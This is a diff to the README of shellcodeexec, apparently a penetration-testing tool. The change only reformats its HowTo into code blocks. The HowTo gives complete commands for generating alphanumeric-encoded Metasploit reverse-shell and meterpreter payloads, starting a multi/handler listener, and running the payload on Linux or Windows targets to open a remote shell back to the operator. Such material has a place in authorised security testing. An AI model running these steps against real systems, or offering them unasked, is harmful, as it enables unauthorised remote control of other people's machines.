@@ -34,22 +34,29 @@ shellcodeexec:
 ## HowTo
 
 1. Generate a Metasploit shellcode and encode it with the alphanumeric encoder. For example for a Linux target:
- $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
-
+```
+$ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
+```
 Or for a Windows target:
-    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
-
+```
+$ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
+```
 2. Execute the Metasploit multi/handler listener on your machine. For example for a Linux target:
 ```
 $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
 ```
-
 Or for a Windows target:
-    $ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
+```
+$ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
+```
 3. Execute the alphanumeric-encoded shellcode with this tool. For example on the Linux target:
-    $ ./shellcodeexec <msfencode's alphanumeric-encoded payload>
+```
+$ ./shellcodeexec <msfencode's alphanumeric-encoded payload>
+```
 Or, on the Windows target:
-    C:\WINDOWS\Temp>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
+```
+C:\WINDOWS\Temp>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
+```
 
 ## License
 
